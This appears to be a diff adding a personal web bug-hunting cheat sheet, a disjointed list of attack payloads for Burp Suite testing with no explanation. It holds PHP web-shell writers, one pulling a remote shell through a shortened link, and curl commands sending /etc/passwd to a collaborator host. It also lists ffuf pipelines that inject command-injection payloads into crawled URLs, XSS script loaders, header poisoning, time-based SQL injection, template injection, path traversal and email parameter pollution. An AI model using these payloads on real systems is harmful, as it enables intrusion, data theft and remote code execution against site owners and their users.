@@ -1,0 +1,163 @@
+
+                       BURPSUITE TESTING.......................................RECON-VILLAGES
+ 
+ 
+ 
+ 
+{"email":["ibrahimhaxor@gmail.com","ibrahimhaxor1@gmail.com"]}
+
+
+```
+1. email= ibrahimhaxor1%40gmail.com&email=ibrahimhaxor%40gmail.com
+2. email= ibrahimhaxor1%40gmail.com%20email=ibrahimhaxor%40gmail.com
+3. email= ibrahimhaxor1%40gmail.com |email=ibrahimhaxor%40gmail.com
+4. email= victim@gmail.com%0d%0acc:attacker@gmil.com
+5. email= victim@gmail.com&code= my password re
+
+1. email= ibrahimhaxor1%40gmail.com,email=ibrahimhaxor%40gmail.com
+
+1. email= ibrahimhaxor1%40gmail.com|email=ibrahimhaxor%40gmail.com
+
+ =<php> file_put_contents('Nama Shell.php', '<?php echo "######"; ?>')</php>
+ 
+ <php> file_put_contents('Nama Shell.php', '<?php phpinfo(); ?>')</php>
+ 
+burppp
+
+cat armuurls.txt | grep "=" | qsreplace -a "'" | ffuf -w - -u FUZZ -x http://127.0.0.1:8080
+
+cat armyurls.txt | grep '=' | qsreplace -a " ||curl+v+http://vcbfzo4w0lcpz1wusl3i5dannet4ht.burpcollaborator.net/$(id)" | ffuf -w - -u FUZZ -r -x http://127.0.0.1:8080
+
+User-Agent
+User-Agent: '><script src=https://Nigeria.xss.ht></script>
+ 
+ 
+ 
+
+ 
+                        
+X-Forwarded-For: 127.0.0.1
+
+X-Forwarded-Host : foo"><script src=//dtf.pw/2.js></script><x=".com
+
+-Forwarded-For: evil-website.com
+X-Forwarded-Host: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com
+
+"><!'/*"*\'/*\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //>#
+
+
+
+<?php system ('ls');?>
+<?php system ('uname -a');?>
+<?php system ('cat /etc/passwd');?>
+
+?php file_put_contents("Shell.php", file_get_contents("https://bit.ly/3nuVpHL"));?>
+
+
+
+`curl rqly0bzss0mv2xpc9m7v1wb8nztqhf.burpcollaborator.net`
+
+
+
+`curl -F shl=@/etc/passwd rqly0bzss0mv2xpc9m7v1wb8nztqhf.burpcollaborator.net`
+
+ping.
+
+echo%OD%OAsleep+5
+
+'sleep 5'
+
+X-Forwarded-Host: foo"><script src=//dtf.pw/2.js></script><x=".com
+
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+
+<?php system ('cat /etc/passwd');?>
+
+"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+
+
+username >'+print 12345+' password 1
+
+urlencode
+
+%27%2Bprint+12345%2B%27
+
+CSRF TO SSTI
+{{file_get_contents("/etc/passwd")}}
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+{{7*’7'}}
+#{ 5* 8 }
+,@(5+5)
+..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc..%2Fpasswd..%2F00.txt//.%00
+
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+
+',0)waitfor delay'0:0:05'-- 
+
+0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
+
+if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0)
+
+
+0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z
+
+
+
+
+
++or+sleep(0.000000001)
+
+
+
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+if(now()=sysdate(),sleep(5),0)
+
+<a href=”https://evil.com”>YOCLICKTHIS</href>
+XSS (Cross-Site Scripting):
+
+->test+(<script>alert(0)</script>)@example.com ->test@example(<script>alert(0)</script>).com ->"<script>alert(0)</script>"@example.com
+
+Template injection:
+
+->"<%= 7 * 7 %>"@example.com ->test+(${{7*7}}}@example.com
+
+SQL injection:
+
+->" OR 1-1 - "@example.com
+
+->"mail'); DROP TABLE users;--"@example.com
+
+SSRF (Server-Side Request Forgery): ->Tom.hardy@abc123.burpcollaborator.net ->Tom.hardy@[127.0.0.1]
+
+Parameter pollution: ->victim&email=attacker@example.com
+
+
+
+
+
+PUT /test.txt HTTP/1.1
+Host: mestern.co.za
+Content-Type: text/html
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 18
+
+PUT Text
+Here
